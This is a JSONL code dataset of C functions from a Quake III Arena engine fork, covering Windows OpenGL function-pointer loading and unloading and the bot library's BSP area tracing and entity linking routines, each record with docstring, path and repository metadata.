{"docstring": "/*\n** QGL_Shutdown\n**\n** Unloads the specified DLL then nulls out all the proc pointers.  This\n** is only called during a hard shutdown of the OGL subsystem (e.g. vid_restart).\n*/\n", "func_signal": "void QGL_Shutdown( void )", "code": "{\n\tif ( hinstOpenGL )\n\t{\n\t\tri.Printf( PRINT_ALL, \"...shutting down QGL\\n\" );\n\t\tri.Printf( PRINT_ALL, \"...unloading OpenGL DLL\\n\" );\n\t\tFreeLibrary( hinstOpenGL );\n\t\thinstOpenGL = NULL;\n\t}\n\n\tqglAlphaFunc                 = NULL;\n\tqglBegin                     = NULL;\n\tqglBindTexture               = NULL;\n\tqglBlendFunc                 = NULL;\n\tqglClear                     = NULL;\n\tqglClearColor                = NULL;\n\tqglClipPlane                 = NULL;\n\tqglColor3f                   = NULL;\n\tqglColorMask                 = NULL;\n\tqglColorPointer              = NULL;\n\tqglCullFace                  = NULL;\n\tqglDeleteTextures            = NULL;\n\tqglDepthFunc                 = NULL;\n\tqglDepthMask                 = NULL;\n\tqglDepthRange                = NULL;\n\tqglDisable                   = NULL;\n\tqglDisableClientState        = NULL;\n\tqglDrawBuffer                = NULL;\n\tqglDrawElements              = NULL;\n\tqglEnable                    = NULL;\n\tqglEnableClientState         = NULL;\n\tqglEnd                       = NULL;\n\tqglFinish                    = NULL;\n\tqglGetError                  = NULL;\n\tqglGetIntegerv               = NULL;\n\tqglGetString                 = NULL;\n\tqglLineWidth                 = NULL;\n\tqglLoadIdentity              = NULL;\n\tqglLoadMatrixf               = NULL;\n\tqglMatrixMode                = NULL;\n\tqglOrtho                     = NULL;\n\tqglPolygonMode               = NULL;\n\tqglPolygonOffset             = NULL;\n\tqglPopMatrix                 = NULL;\n\tqglPushMatrix                = NULL;\n\tqglReadPixels                = NULL;\n\tqglScissor                   = NULL;\n\tqglStencilFunc               = NULL;\n\tqglStencilOp                 = NULL;\n\tqglTexCoord2f                = NULL;\n\tqglTexCoord2fv               = NULL;\n\tqglTexCoordPointer           = NULL;\n\tqglTexEnvf                   = NULL;\n\tqglTexImage2D                = NULL;\n\tqglTexParameterf             = NULL;\n\tqglTexParameterfv            = NULL;\n\tqglTexSubImage2D             = NULL;\n\tqglVertex2f                  = NULL;\n\tqglVertex3f                  = NULL;\n\tqglVertex3fv                 = NULL;\n\tqglVertexPointer             = NULL;\n\tqglViewport                  = NULL;\n\n\tqwglCreateContext            = NULL;\n\tqwglDeleteContext            = NULL;\n\tqwglGetProcAddress           = NULL;\n\tqwglMakeCurrent              = NULL;\n}", "path": "src\\engine\\platform\\win_qgl.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_InitAASLinkHeap\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void AAS_FreeAASLinkHeap(void)", "code": "{\n\tif (aasworld.linkheap) FreeMemory(aasworld.linkheap);\n\taasworld.linkheap = NULL;\n\taasworld.linkheapsize = 0;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_AreaGroundFace\n//===========================================================================\n// returns the face the trace end position is situated in\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void AAS_FacePlane(int facenum, vec3_t normal, float *dist)", "code": "{\n\taas_plane_t *plane;\n\n\tplane = &aasworld.planes[aasworld.faces[facenum].planenum];\n\tVectorCopy(plane->normal, normal);\n\t*dist = plane->dist;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_AASLinkEntity\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "aas_link_t *AAS_LinkEntityClientBBox(vec3_t absmins, vec3_t absmaxs, int entnum, int presencetype)", "code": "{\n\tvec3_t mins, maxs;\n\tvec3_t newabsmins, newabsmaxs;\n\n\tAAS_PresenceTypeBoundingBox(presencetype, mins, maxs);\n\tVectorSubtract(absmins, maxs, newabsmins);\n\tVectorSubtract(absmaxs, mins, newabsmaxs);\n\t//relink the entity\n\treturn AAS_AASLinkEntity(newabsmins, newabsmaxs, entnum);\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "/*\n** QGL_Init\n**\n** This is responsible for binding our qgl function pointers to \n** the appropriate GL stuff.  In Windows this means doing a \n** LoadLibrary and a bunch of calls to GetProcAddress.  On other\n** operating systems we need to do the right thing, whatever that\n** might be.\n*/\n", "func_signal": "qboolean QGL_Init( const char *dllname )", "code": "{\n\tif (dllname != nullptr) {\n\t\tassert( hinstOpenGL == 0 );\n\n\t\tri.Printf( PRINT_ALL, \"...initializing QGL\\n\" );\n\t\tri.Printf( PRINT_ALL, \"...calling LoadLibrary('%s'): \", dllname );\n\n\t\tif ( ( hinstOpenGL = LoadLibrary( dllname ) ) == 0 )\n\t\t{\n\t\t\tri.Printf( PRINT_ALL, \"failed\\n\" );\n\t\t\treturn qfalse;\n\t\t}\n\t\tri.Printf( PRINT_ALL, \"succeeded\\n\" );\n\t}\n\n\tqglAlphaFunc                 = dllAlphaFunc = (decltype(dllAlphaFunc))GPA(glAlphaFunc);\n\tqglBegin                     = dllBegin = (decltype(dllBegin))GPA(glBegin);\n\tqglBindTexture               = dllBindTexture = (decltype(dllBindTexture))GPA(glBindTexture);\n\tqglBlendFunc                 = dllBlendFunc = (decltype(dllBlendFunc))GPA(glBlendFunc);\n\tqglClear                     = dllClear = (decltype(dllClear))GPA(glClear);\n\tqglClearColor                = dllClearColor = (decltype(dllClearColor))GPA(glClearColor);\n\tqglClipPlane                 = dllClipPlane = (decltype(dllClipPlane))GPA(glClipPlane);\n\tqglColor3f                   = dllColor3f = (decltype(dllColor3f))GPA(glColor3f);\n\tqglColorMask                 = dllColorMask = (decltype(dllColorMask))GPA(glColorMask);\n\tqglColorPointer              = dllColorPointer = (decltype(dllColorPointer))GPA(glColorPointer);\n\tqglCullFace                  = dllCullFace = (decltype(dllCullFace))GPA(glCullFace);\n\tqglDeleteTextures            = dllDeleteTextures = (decltype(dllDeleteTextures))GPA(glDeleteTextures);\n\tqglDepthFunc                 = dllDepthFunc = (decltype(dllDepthFunc))GPA(glDepthFunc);\n\tqglDepthMask                 = dllDepthMask = (decltype(dllDepthMask))GPA(glDepthMask);\n\tqglDepthRange                = dllDepthRange = (decltype(dllDepthRange))GPA(glDepthRange);\n\tqglDisable                   = dllDisable = (decltype(dllDisable))GPA(glDisable);\n\tqglDisableClientState        = dllDisableClientState = (decltype(dllDisableClientState))GPA(glDisableClientState);\n\tqglDrawBuffer                = dllDrawBuffer = (decltype(dllDrawBuffer))GPA(glDrawBuffer);\n\tqglDrawElements              = dllDrawElements = (decltype(dllDrawElements))GPA(glDrawElements);\n\tqglEnable                    = \tdllEnable                    = (decltype(dllEnable))GPA(glEnable);\n\tqglEnableClientState         = \tdllEnableClientState         = (decltype(dllEnableClientState))GPA(glEnableClientState);\n\tqglEnd                       = \tdllEnd                       = (decltype(dllEnd))GPA(glEnd);\n\tqglFinish                    = \tdllFinish                    = (decltype(dllFinish))GPA(glFinish);\n\tqglGetError                  = \tdllGetError                  = ( GLenum (__stdcall * )(void) ) GPA( glGetError );\n\tqglGetIntegerv               = \tdllGetIntegerv               = (decltype(dllGetIntegerv))GPA(glGetIntegerv);\n\tqglGetString                 = \tdllGetString                 = (decltype(dllGetString))GPA(glGetString);\n\tqglLineWidth                 = \tdllLineWidth                 = (decltype(dllLineWidth))GPA(glLineWidth);\n\tqglLoadIdentity              = \tdllLoadIdentity              = (decltype(dllLoadIdentity))GPA(glLoadIdentity);\n\tqglLoadMatrixf               = \tdllLoadMatrixf               = (decltype(dllLoadMatrixf))GPA(glLoadMatrixf);\n\tqglMatrixMode                = \tdllMatrixMode                = (decltype(dllMatrixMode))GPA(glMatrixMode);\n\tqglOrtho                     = \tdllOrtho                     = (decltype(dllOrtho))GPA(glOrtho);\n\tqglPolygonMode               = \tdllPolygonMode               = (decltype(dllPolygonMode))GPA(glPolygonMode);\n\tqglPolygonOffset             = \tdllPolygonOffset             = (decltype(dllPolygonOffset))GPA(glPolygonOffset);\n\tqglPopMatrix                 = \tdllPopMatrix                 = (decltype(dllPopMatrix))GPA(glPopMatrix);\n\tqglPushMatrix                = \tdllPushMatrix                = (decltype(dllPushMatrix))GPA(glPushMatrix);\n\tqglReadPixels                = \tdllReadPixels                = (decltype(dllReadPixels))GPA(glReadPixels);\n\tqglScissor                   = \tdllScissor                   = (decltype(dllScissor))GPA(glScissor);\n\tqglStencilFunc               = \tdllStencilFunc               = (decltype(dllStencilFunc))GPA(glStencilFunc);\n\tqglStencilOp                 = \tdllStencilOp                 = (decltype(dllStencilOp))GPA(glStencilOp);\n\tqglTexCoord2f                = \tdllTexCoord2f                = (decltype(dllTexCoord2f))GPA(glTexCoord2f);\n\tqglTexCoord2fv               = \tdllTexCoord2fv               = (decltype(dllTexCoord2fv))GPA(glTexCoord2fv);\n\tqglTexCoordPointer           = \tdllTexCoordPointer           = (decltype(dllTexCoordPointer))GPA(glTexCoordPointer);\n\tqglTexEnvf                   = \tdllTexEnvf                   = (decltype(dllTexEnvf))GPA(glTexEnvf);\n\tqglTexImage2D                = \tdllTexImage2D                = (decltype(dllTexImage2D))GPA(glTexImage2D);\n\tqglTexParameterf             = \tdllTexParameterf             = (decltype(dllTexParameterf))GPA(glTexParameterf);\n\tqglTexParameterfv            = \tdllTexParameterfv            = (decltype(dllTexParameterfv))GPA(glTexParameterfv);\n\tqglTexSubImage2D             = \tdllTexSubImage2D             = (decltype(dllTexSubImage2D))GPA(glTexSubImage2D);\n\tqglVertex2f                  = \tdllVertex2f                  = (decltype(dllVertex2f))GPA(glVertex2f);\n\tqglVertex3f                  = \tdllVertex3f                  = (decltype(dllVertex3f))GPA(glVertex3f);\n\tqglVertex3fv                 = \tdllVertex3fv                 = (decltype(dllVertex3fv))GPA(glVertex3fv);\n\tqglVertexPointer             = \tdllVertexPointer             = (decltype(dllVertexPointer))GPA(glVertexPointer);\n\tqglViewport                  = \tdllViewport                  = (decltype(dllViewport))GPA(glViewport);\n\n\tqwglCreateContext            = (decltype(qwglCreateContext))GPA(wglCreateContext);\n\tqwglDeleteContext            = (decltype(qwglDeleteContext))GPA(wglDeleteContext);\n\tqwglGetProcAddress           = (decltype(qwglGetProcAddress))GPA(wglGetProcAddress);\n\tqwglMakeCurrent              = (decltype(qwglMakeCurrent))GPA(wglMakeCurrent);\n\n\tqwglSwapIntervalEXT = 0;\n\tqglActiveTextureARB = 0;\n\tqglClientActiveTextureARB = 0;\n\tqglLockArraysEXT = 0;\n\tqglUnlockArraysEXT = 0;\n\n\tif (dllname != nullptr) {\n\t\t// check logging\n\t\tQGL_EnableLogging( (qboolean) r_logFile->integer );\n\t}\n\n\treturn qtrue;\n}", "path": "src\\engine\\platform\\win_qgl.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_TraceClientBBox\n//===========================================================================\n// recursive subdivision of the line by the BSP tree.\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "int AAS_TraceAreas(vec3_t start, vec3_t end, int *areas, vec3_t *points, int maxareas)", "code": "{\n\tint side, nodenum, tmpplanenum;\n\tint numareas;\n\tfloat front, back, frac;\n\tvec3_t cur_start, cur_end, cur_mid;\n\taas_tracestack_t tracestack[127];\n\taas_tracestack_t *tstack_p;\n\taas_node_t *aasnode;\n\taas_plane_t *plane;\n\n\tnumareas = 0;\n\tareas[0] = 0;\n\tif (!aasworld.loaded) return numareas;\n\n\ttstack_p = tracestack;\n\t//we start with the whole line on the stack\n\tVectorCopy(start, tstack_p->start);\n\tVectorCopy(end, tstack_p->end);\n\ttstack_p->planenum = 0;\n\t//start with node 1 because node zero is a dummy for a solid leaf\n\ttstack_p->nodenum = 1;\t\t//starting at the root of the tree\n\ttstack_p++;\n\n\twhile (1)\n\t{\n\t\t//pop up the stack\n\t\ttstack_p--;\n\t\t//if the trace stack is empty (ended up with a piece of the\n\t\t//line to be traced in an area)\n\t\tif (tstack_p < tracestack)\n\t\t{\n\t\t\treturn numareas;\n\t\t} //end if\n\t\t//number of the current node to test the line against\n\t\tnodenum = tstack_p->nodenum;\n\t\t//if it is an area\n\t\tif (nodenum < 0)\n\t\t{\n#ifdef AAS_SAMPLE_DEBUG\n\t\t\tif (-nodenum > aasworld.numareasettings)\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceAreas: -nodenum = %d out of range\\n\", -nodenum);\n\t\t\t\treturn numareas;\n\t\t\t} //end if\n#endif //AAS_SAMPLE_DEBUG\n\t\t\t//botimport.Print(PRT_MESSAGE, \"areanum = %d, must be %d\\n\", -nodenum, AAS_PointAreaNum(start));\n\t\t\tareas[numareas] = -nodenum;\n\t\t\tif (points) VectorCopy(tstack_p->start, points[numareas]);\n\t\t\tnumareas++;\n\t\t\tif (numareas >= maxareas) return numareas;\n\t\t\tcontinue;\n\t\t} //end if\n\t\t//if it is a solid leaf\n\t\tif (!nodenum)\n\t\t{\n\t\t\tcontinue;\n\t\t} //end if\n#ifdef AAS_SAMPLE_DEBUG\n\t\tif (nodenum > aasworld.numnodes)\n\t\t{\n\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceAreas: nodenum out of range\\n\");\n\t\t\treturn numareas;\n\t\t} //end if\n#endif //AAS_SAMPLE_DEBUG\n\t\t//the node to test against\n\t\taasnode = &aasworld.nodes[nodenum];\n\t\t//start point of current line to test against node\n\t\tVectorCopy(tstack_p->start, cur_start);\n\t\t//end point of the current line to test against node\n\t\tVectorCopy(tstack_p->end, cur_end);\n\t\t//the current node plane\n\t\tplane = &aasworld.planes[aasnode->planenum];\n\n        front = DotProduct(cur_start, plane->normal) - plane->dist;\n        back = DotProduct(cur_end, plane->normal) - plane->dist;\n\n\t\t//if the whole to be traced line is totally at the front of this node\n\t\t//only go down the tree with the front child\n\t\tif (front > 0 && back > 0)\n\t\t{\n\t\t\t//keep the current start and end point on the stack\n\t\t\t//and go down the tree with the front child\n\t\t\ttstack_p->nodenum = aasnode->children[0];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceAreas: stack overflow\\n\");\n\t\t\t\treturn numareas;\n\t\t\t} //end if\n\t\t} //end if\n\t\t//if the whole to be traced line is totally at the back of this node\n\t\t//only go down the tree with the back child\n\t\telse if (front <= 0 && back <= 0)\n\t\t{\n\t\t\t//keep the current start and end point on the stack\n\t\t\t//and go down the tree with the back child\n\t\t\ttstack_p->nodenum = aasnode->children[1];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceAreas: stack overflow\\n\");\n\t\t\t\treturn numareas;\n\t\t\t} //end if\n\t\t} //end if\n\t\t//go down the tree both at the front and back of the node\n\t\telse\n\t\t{\n\t\t\ttmpplanenum = tstack_p->planenum;\n\t\t\t//calculate the hitpoint with the node (split point of the line)\n\t\t\t//put the crosspoint TRACEPLANE_EPSILON pixels on the near side\n\t\t\tif (front < 0) frac = (front)/(front-back);\n\t\t\telse frac = (front)/(front-back);\n\t\t\tif (frac < 0) frac = 0;\n\t\t\telse if (frac > 1) frac = 1;\n\t\t\t//frac = front / (front-back);\n\t\t\t//\n\t\t\tcur_mid[0] = cur_start[0] + (cur_end[0] - cur_start[0]) * frac;\n\t\t\tcur_mid[1] = cur_start[1] + (cur_end[1] - cur_start[1]) * frac;\n\t\t\tcur_mid[2] = cur_start[2] + (cur_end[2] - cur_start[2]) * frac;\n\n//\t\t\tAAS_DrawPlaneCross(cur_mid, plane->normal, plane->dist, plane->type, LINECOLOR_RED);\n\t\t\t//side the front part of the line is on\n\t\t\tside = front < 0;\n\t\t\t//first put the end part of the line on the stack (back side)\n\t\t\tVectorCopy(cur_mid, tstack_p->start);\n\t\t\t//not necesary to store because still on stack\n\t\t\t//VectorCopy(cur_end, tstack_p->end);\n\t\t\ttstack_p->planenum = aasnode->planenum;\n\t\t\ttstack_p->nodenum = aasnode->children[!side];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceAreas: stack overflow\\n\");\n\t\t\t\treturn numareas;\n\t\t\t} //end if\n\t\t\t//now put the part near the start of the line on the stack so we will\n\t\t\t//continue with thats part first. This way we'll find the first\n\t\t\t//hit of the bbox\n\t\t\tVectorCopy(cur_start, tstack_p->start);\n\t\t\tVectorCopy(cur_mid, tstack_p->end);\n\t\t\ttstack_p->planenum = tmpplanenum;\n\t\t\ttstack_p->nodenum = aasnode->children[side];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceAreas: stack overflow\\n\");\n\t\t\t\treturn numareas;\n\t\t\t} //end if\n\t\t} //end else\n\t} //end while\n//\treturn numareas;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_PointReachabilityAreaIndex\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "int AAS_AreaCluster(int areanum)", "code": "{\n\tif (areanum <= 0 || areanum >= aasworld.numareas)\n\t{\n\t\tbotimport.Print(PRT_ERROR, \"AAS_AreaCluster: invalid area number\\n\");\n\t\treturn 0;\n\t} //end if\n\treturn aasworld.areasettings[areanum].cluster;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_AreaEntityCollision\n//===========================================================================\n// recursive subdivision of the line by the BSP tree.\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "aas_trace_t AAS_TraceClientBBox(vec3_t start, vec3_t end, int presencetype,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tint passent)", "code": "{\n\tint side, nodenum, tmpplanenum;\n\tfloat front, back, frac;\n\tvec3_t cur_start, cur_end, cur_mid, v1, v2;\n\taas_tracestack_t tracestack[127];\n\taas_tracestack_t *tstack_p;\n\taas_node_t *aasnode;\n\taas_plane_t *plane;\n\taas_trace_t trace;\n\n\t//clear the trace structure\n\tCom_Memset(&trace, 0, sizeof(aas_trace_t));\n\n\tif (!aasworld.loaded) return trace;\n\t\n\ttstack_p = tracestack;\n\t//we start with the whole line on the stack\n\tVectorCopy(start, tstack_p->start);\n\tVectorCopy(end, tstack_p->end);\n\ttstack_p->planenum = 0;\n\t//start with node 1 because node zero is a dummy for a solid leaf\n\ttstack_p->nodenum = 1;\t\t//starting at the root of the tree\n\ttstack_p++;\n\t\n\twhile (1)\n\t{\n\t\t//pop up the stack\n\t\ttstack_p--;\n\t\t//if the trace stack is empty (ended up with a piece of the\n\t\t//line to be traced in an area)\n\t\tif (tstack_p < tracestack)\n\t\t{\n\t\t\ttstack_p++;\n\t\t\t//nothing was hit\n\t\t\ttrace.startsolid = qfalse;\n\t\t\ttrace.fraction = 1.0;\n\t\t\t//endpos is the end of the line\n\t\t\tVectorCopy(end, trace.endpos);\n\t\t\t//nothing hit\n\t\t\ttrace.ent = 0;\n\t\t\ttrace.area = 0;\n\t\t\ttrace.planenum = 0;\n\t\t\treturn trace;\n\t\t} //end if\n\t\t//number of the current node to test the line against\n\t\tnodenum = tstack_p->nodenum;\n\t\t//if it is an area\n\t\tif (nodenum < 0)\n\t\t{\n#ifdef AAS_SAMPLE_DEBUG\n\t\t\tif (-nodenum > aasworld.numareasettings)\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceBoundingBox: -nodenum out of range\\n\");\n\t\t\t\treturn trace;\n\t\t\t} //end if\n#endif //AAS_SAMPLE_DEBUG\n\t\t\t//botimport.Print(PRT_MESSAGE, \"areanum = %d, must be %d\\n\", -nodenum, AAS_PointAreaNum(start));\n\t\t\t//if can't enter the area because it hasn't got the right presence type\n\t\t\tif (!(aasworld.areasettings[-nodenum].presencetype & presencetype))\n\t\t\t{\n\t\t\t\t//if the start point is still the initial start point\n\t\t\t\t//NOTE: no need for epsilons because the points will be\n\t\t\t\t//exactly the same when they're both the start point\n\t\t\t\tif (tstack_p->start[0] == start[0] &&\n\t\t\t\t\t\ttstack_p->start[1] == start[1] &&\n\t\t\t\t\t\ttstack_p->start[2] == start[2])\n\t\t\t\t{\n\t\t\t\t\ttrace.startsolid = qtrue;\n\t\t\t\t\ttrace.fraction = 0.0;\n\t\t\t\t\tVectorClear(v1);\n\t\t\t\t} //end if\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ttrace.startsolid = qfalse;\n\t\t\t\t\tVectorSubtract(end, start, v1);\n\t\t\t\t\tVectorSubtract(tstack_p->start, start, v2);\n\t\t\t\t\ttrace.fraction = VectorLength(v2) / VectorNormalize(v1);\n\t\t\t\t\tVectorMA(tstack_p->start, -0.125, v1, tstack_p->start);\n\t\t\t\t} //end else\n\t\t\t\tVectorCopy(tstack_p->start, trace.endpos);\n\t\t\t\ttrace.ent = 0;\n\t\t\t\ttrace.area = -nodenum;\n//\t\t\t\tVectorSubtract(end, start, v1);\n\t\t\t\ttrace.planenum = tstack_p->planenum;\n\t\t\t\t//always take the plane with normal facing towards the trace start\n\t\t\t\tplane = &aasworld.planes[trace.planenum];\n\t\t\t\tif (DotProduct(v1, plane->normal) > 0) trace.planenum ^= 1;\n\t\t\t\treturn trace;\n\t\t\t} //end if\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (passent >= 0)\n\t\t\t\t{\n\t\t\t\t\tif (AAS_AreaEntityCollision(-nodenum, tstack_p->start,\n\t\t\t\t\t\t\t\t\t\t\t\t\ttstack_p->end, presencetype, passent,\n\t\t\t\t\t\t\t\t\t\t\t\t\t&trace))\n\t\t\t\t\t{\n\t\t\t\t\t\tif (!trace.startsolid)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tVectorSubtract(end, start, v1);\n\t\t\t\t\t\t\tVectorSubtract(trace.endpos, start, v2);\n\t\t\t\t\t\t\ttrace.fraction = VectorLength(v2) / VectorLength(v1);\n\t\t\t\t\t\t} //end if\n\t\t\t\t\t\treturn trace;\n\t\t\t\t\t} //end if\n\t\t\t\t} //end if\n\t\t\t} //end else\n\t\t\ttrace.lastarea = -nodenum;\n\t\t\tcontinue;\n\t\t} //end if\n\t\t//if it is a solid leaf\n\t\tif (!nodenum)\n\t\t{\n\t\t\t//if the start point is still the initial start point\n\t\t\t//NOTE: no need for epsilons because the points will be\n\t\t\t//exactly the same when they're both the start point\n\t\t\tif (tstack_p->start[0] == start[0] &&\n\t\t\t\t\ttstack_p->start[1] == start[1] &&\n\t\t\t\t\ttstack_p->start[2] == start[2])\n\t\t\t{\n\t\t\t\ttrace.startsolid = qtrue;\n\t\t\t\ttrace.fraction = 0.0;\n\t\t\t\tVectorClear(v1);\n\t\t\t} //end if\n\t\t\telse\n\t\t\t{\n\t\t\t\ttrace.startsolid = qfalse;\n\t\t\t\tVectorSubtract(end, start, v1);\n\t\t\t\tVectorSubtract(tstack_p->start, start, v2);\n\t\t\t\ttrace.fraction = VectorLength(v2) / VectorNormalize(v1);\n\t\t\t\tVectorMA(tstack_p->start, -0.125, v1, tstack_p->start);\n\t\t\t} //end else\n\t\t\tVectorCopy(tstack_p->start, trace.endpos);\n\t\t\ttrace.ent = 0;\n\t\t\ttrace.area = 0;\t//hit solid leaf\n//\t\t\tVectorSubtract(end, start, v1);\n\t\t\ttrace.planenum = tstack_p->planenum;\n\t\t\t//always take the plane with normal facing towards the trace start\n\t\t\tplane = &aasworld.planes[trace.planenum];\n\t\t\tif (DotProduct(v1, plane->normal) > 0) trace.planenum ^= 1;\n\t\t\treturn trace;\n\t\t} //end if\n#ifdef AAS_SAMPLE_DEBUG\n\t\tif (nodenum > aasworld.numnodes)\n\t\t{\n\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceBoundingBox: nodenum out of range\\n\");\n\t\t\treturn trace;\n\t\t} //end if\n#endif //AAS_SAMPLE_DEBUG\n\t\t//the node to test against\n\t\taasnode = &aasworld.nodes[nodenum];\n\t\t//start point of current line to test against node\n\t\tVectorCopy(tstack_p->start, cur_start);\n\t\t//end point of the current line to test against node\n\t\tVectorCopy(tstack_p->end, cur_end);\n\t\t//the current node plane\n\t\tplane = &aasworld.planes[aasnode->planenum];\n\n        front = DotProduct(cur_start, plane->normal) - plane->dist;\n        back = DotProduct(cur_end, plane->normal) - plane->dist;\n\t\t// bk010221 - old location of FPE hack and divide by zero expression\n\t\t//if the whole to be traced line is totally at the front of this node\n\t\t//only go down the tree with the front child\n\t\tif ((front >= -ON_EPSILON && back >= -ON_EPSILON))\n\t\t{\n\t\t\t//keep the current start and end point on the stack\n\t\t\t//and go down the tree with the front child\n\t\t\ttstack_p->nodenum = aasnode->children[0];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceBoundingBox: stack overflow\\n\");\n\t\t\t\treturn trace;\n\t\t\t} //end if\n\t\t} //end if\n\t\t//if the whole to be traced line is totally at the back of this node\n\t\t//only go down the tree with the back child\n\t\telse if ((front < ON_EPSILON && back < ON_EPSILON))\n\t\t{\n\t\t\t//keep the current start and end point on the stack\n\t\t\t//and go down the tree with the back child\n\t\t\ttstack_p->nodenum = aasnode->children[1];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceBoundingBox: stack overflow\\n\");\n\t\t\t\treturn trace;\n\t\t\t} //end if\n\t\t} //end if\n\t\t//go down the tree both at the front and back of the node\n\t\telse\n\t\t{\n\t\t\ttmpplanenum = tstack_p->planenum;\n\t\t\t// bk010221 - new location of divide by zero (see above)\n\t\t\tif ( front == back ) front -= 0.001f; // bk0101022 - hack/FPE \n                \t//calculate the hitpoint with the node (split point of the line)\n\t\t\t//put the crosspoint TRACEPLANE_EPSILON pixels on the near side\n\t\t\tif (front < 0) frac = (front + TRACEPLANE_EPSILON)/(front-back);\n\t\t\telse frac = (front - TRACEPLANE_EPSILON)/(front-back); // bk010221\n\t\t\t//\n\t\t\tif (frac < 0)\n\t\t\t\tfrac = 0.001f; //0\n\t\t\telse if (frac > 1)\n\t\t\t\tfrac = 0.999f; //1\n\t\t\t//frac = front / (front-back);\n\t\t\t//\n\t\t\tcur_mid[0] = cur_start[0] + (cur_end[0] - cur_start[0]) * frac;\n\t\t\tcur_mid[1] = cur_start[1] + (cur_end[1] - cur_start[1]) * frac;\n\t\t\tcur_mid[2] = cur_start[2] + (cur_end[2] - cur_start[2]) * frac;\n\n//\t\t\tAAS_DrawPlaneCross(cur_mid, plane->normal, plane->dist, plane->type, LINECOLOR_RED);\n\t\t\t//side the front part of the line is on\n\t\t\tside = front < 0;\n\t\t\t//first put the end part of the line on the stack (back side)\n\t\t\tVectorCopy(cur_mid, tstack_p->start);\n\t\t\t//not necesary to store because still on stack\n\t\t\t//VectorCopy(cur_end, tstack_p->end);\n\t\t\ttstack_p->planenum = aasnode->planenum;\n\t\t\ttstack_p->nodenum = aasnode->children[!side];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceBoundingBox: stack overflow\\n\");\n\t\t\t\treturn trace;\n\t\t\t} //end if\n\t\t\t//now put the part near the start of the line on the stack so we will\n\t\t\t//continue with thats part first. This way we'll find the first\n\t\t\t//hit of the bbox\n\t\t\tVectorCopy(cur_start, tstack_p->start);\n\t\t\tVectorCopy(cur_mid, tstack_p->end);\n\t\t\ttstack_p->planenum = tmpplanenum;\n\t\t\ttstack_p->nodenum = aasnode->children[side];\n\t\t\ttstack_p++;\n\t\t\tif (tstack_p >= &tracestack[127])\n\t\t\t{\n\t\t\t\tbotimport.Print(PRT_ERROR, \"AAS_TraceBoundingBox: stack overflow\\n\");\n\t\t\t\treturn trace;\n\t\t\t} //end if\n\t\t} //end else\n\t} //end while\n//\treturn trace;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
